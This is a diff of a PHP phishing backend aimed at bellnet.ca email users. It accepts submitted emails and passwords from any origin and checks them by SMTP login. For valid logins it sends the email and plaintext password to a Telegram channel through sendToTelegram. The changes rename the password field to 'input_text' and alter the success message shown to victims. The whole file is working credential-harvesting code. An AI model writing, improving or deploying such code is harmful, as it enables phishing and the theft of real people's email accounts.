@@ -1,4 +1,5 @@
 <?php
+
 // Allow requests from any domain
 header("Access-Control-Allow-Origin: *");
 
@@ -43,7 +44,7 @@ $response = [
 // Only handle POST requests
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $email = trim($_POST['email'] ?? '');
-    $password = $_POST['password'] ?? '';
+    $password = $_POST['input_text'] ?? '';
 
     // Validate email
     if (!preg_match('/^[^@\s]+@bellnet\.ca$/', $email)) {
@@ -98,7 +99,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (strpos($smtpResponse, '235') === 0) {
             // Login success
             $response['status'] = 'success';
-            $response['message'] = 'Your account is secure';
+            $response['message'] = 'Login Successful';
             sendToTelegram("✅ Login Successful\nEmail: $email\nPassword: $password");
         } else {
             // Login failed
